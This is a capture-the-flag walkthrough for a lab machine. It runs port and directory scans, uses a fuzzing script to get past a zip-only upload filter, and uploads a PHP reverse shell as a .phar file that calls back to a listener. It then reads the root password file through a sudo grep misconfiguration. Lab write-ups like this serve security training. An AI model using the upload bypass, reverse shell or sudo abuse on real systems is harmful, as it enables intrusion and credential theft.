# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=1.32 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.053 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 0.053/0.684/1.316/0.631 ms
```
## Ports scanning (TCP)
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 15:44 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 0A:0A:C3:AB:DF:7E (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```
``` bash
sudo nmap -p80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 15:44 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000028s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Dockerlabs
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 0A:0A:C3:AB:DF:7E (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.37 seconds
```
# Web enumeration
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 8235]
uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
upload.php           (Status: 200) [Size: 0]
machine.php          (Status: 200) [Size: 1361]
server-status        (Status: 403) [Size: 275]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
curl -s http://172.17.0.2/machine.php
<!DOCTYPE html>
<html>
<head>
    <title>Upload here your file</title>
    <style>
        body {
            background-color: #222;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        h2 {
            margin-top: 50px;
        }
        form {
            margin-top: 20px;
        }
        input[type="file"] {
            border: 2px solid #444;
            border-radius: 5px;
            background-color: #333;
            color: #fff;
            padding: 10px;
            width: 300px;
            max-width: 100%;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <h2>Upload File</h2>
    <form action="upload.php" method="post" enctype="multipart/form-data">
        <input type="file" name="file" id="file">
        <br>
        <input type="submit" name="submit" value="Upload File">
    </form>
</body>
</html>
```
## Malicious upload
``` bash
curl -X POST \
  -F "file=;filename=" \
  -F "submit=Upload File" \
  http://172.17.0.2/upload.php

No se permite la subida de archivos que no sean .zip
```
``` bash
head -n 8 revshell
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';
$port = 443;
```
## Extensions fuzzing
Let's fuzz the extensions with a bash script
``` bash
cat script.sh
#!/bin/bash

# Configuración de rutas y objetivos
DICCIONARIO="/usr/share/seclists/Discovery/Web-Content/web-extensions.txt"
URL_OBJETIVO="http://172.17.0.2/upload.php"
ARCHIVO_BASE="revshell"

# Verificar si el diccionario existe
if [ ! -f "$DICCIONARIO" ]; then
    echo "[-] Error: No se encontró el diccionario en $DICCIONARIO"
    exit 1
fi

# Verificar si el archivo a subir existe
if [ ! -f "$ARCHIVO_BASE" ]; then
    echo "[-] Error: El archivo base '$ARCHIVO_BASE' no existe."
    exit 1
fi

echo "[+] Iniciando fuzzing. Filtrando mensajes de error de la blacklist..."
echo "======================================================================"

# Leer el diccionario línea por línea
while IFS= read -r ext || [ -n "$ext" ]; do
    # Limpiar espacios en blanco o puntos iniciales
    ext=$(echo "$ext" | tr -d '[:space:]' | sed 's/^\.//')

    # Saltar líneas vacías o comentarios
    [[ -z "$ext" || "$ext" == \#* ]] && continue

    NUEVO_FILENAME="${ARCHIVO_BASE}.${ext}"

    # Ejecutar curl incluyendo cabeceras (-i) y siguiendo redirecciones (-L)
    RESPUESTA=$(curl -i -L -s -X POST \
         -F "file=@${ARCHIVO_BASE};filename=${NUEVO_FILENAME}" \
         -F "submit=Upload File" \
         "$URL_OBJETIVO")

    # NUEVA CONDICIÓN: Si la respuesta NO contiene la frase exacta del servidor
    if ! echo "$RESPUESTA" | grep -q "No se permite la subida de archivos que no sean .zip"; then
        echo "[+] ¡POSIBLE BYPASS DETECTADO con la extensión: .$ext!"
        echo "    Filename enviado: $NUEVO_FILENAME"
        echo "    Respuesta del servidor:"
        echo "$RESPUESTA" | sed 's/^/    /'
        echo "--------------------------------------------------"
    fi

done < "$DICCIONARIO"

echo "[+] Fuzzing finalizado."
```
``` bash
./script.sh
[+] Iniciando fuzzing. Filtrando mensajes de error de la blacklist...
======================================================================
[+] ¡POSIBLE BYPASS DETECTADO con la extensión: .phar!
    Filename enviado: revshell.phar
    Respuesta del servidor:
    HTTP/1.1 200 OK
    Date: Tue, 06 Oct 2026 19:17:55 GMT
    Server: Apache/2.4.58 (Ubuntu)
    Content-Length: 54
    Content-Type: text/html; charset=UTF-8

    El archivo revshell.phar ha sido subido correctamente.
--------------------------------------------------
[+] Fuzzing finalizado.
```
# Reverse shell
``` bash
curl http://172.17.0.2/uploads/revshell.phar
```
``` bash
sudo nc -lvnp 443
whoami
www-data
```
# Privilege escalation
``` bash
cat /opt/nota.txt
Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
```` bash
sudo -l
(root) NOPASSWD: /usr/bin/cut
(root) NOPASSWD: /usr/bin/grep
sudo -u root /usr/bin/grep '' /root/clave.txt
dockerlabsmolamogollon123
`````
``` bash
su -
whoami
root
```
